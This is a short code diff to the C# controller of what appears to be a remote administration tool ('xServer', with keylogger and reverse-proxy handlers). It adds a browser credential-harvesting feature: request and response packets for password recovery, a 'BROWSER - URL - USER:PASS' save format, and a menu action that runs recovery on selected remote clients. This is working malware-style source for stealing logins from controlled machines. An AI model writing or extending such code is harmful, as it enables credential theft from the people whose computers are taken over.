@@ -31,6 +31,7 @@ namespace xServer.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
+            XMLSettings.SaveFormat = XMLSettings.ReadValueSafe("SaveFormat", "BROWSER - URL - USER:PASS");
 
             XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
             XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
@@ -164,7 +165,9 @@ namespace xServer.Forms
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect),
+                typeof (Core.Packets.ClientPackets.RecoverPassResponse),
+                typeof (Core.Packets.ServerPackets.RecoverPassRequest),
             });
 
             ListenServer.ServerState += ServerState;
@@ -536,7 +539,10 @@ namespace xServer.Forms
 
         private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
         {
-            // TODO
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                new FrmPasswordRecovery(GetSelectedClients().ToList()).ShowDialog();
+            }
         }
 
         private void ctxtKeylogger_Click(object sender, EventArgs e)
